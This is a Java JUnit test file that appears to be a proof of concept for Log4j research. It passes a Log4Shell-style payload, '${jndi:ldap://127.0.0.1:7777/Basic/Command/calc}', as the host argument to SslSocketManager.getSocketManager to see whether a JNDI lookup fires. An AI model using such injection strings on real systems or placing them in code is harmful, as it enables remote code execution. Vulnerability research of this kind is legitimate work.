import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.appender.OutputStreamAppender;
import org.apache.logging.log4j.core.appender.rolling.*;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.DefaultConfiguration;
import org.apache.logging.log4j.core.layout.PatternLayout;
import org.apache.logging.log4j.core.net.SslSocketManager;
import org.apache.logging.log4j.core.net.ssl.SslConfiguration;
import org.apache.logging.log4j.core.net.ssl.SslConfigurationDefaults;
import org.junit.jupiter.api.Test;

public class ManagersPocsTests {

    @Test
    // Потенциально не работает
    public void getSocketManager(){
        TriggeringPolicy policy = CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?");
        RolloverStrategy strategy = DefaultRolloverStrategy.newBuilder()
                .withMax(String.valueOf(3))
                .withConfig(new DefaultConfiguration())
                .withFileIndex("min")
                .build();
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();
        Configuration config = new DefaultConfiguration();

        SslConfiguration configuration = SslConfiguration.createSSLConfiguration(null,null,null,false);
        SslSocketManager.getSocketManager(configuration, "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", 443, 40000, 20000, false, layout, 1024);
    }


}
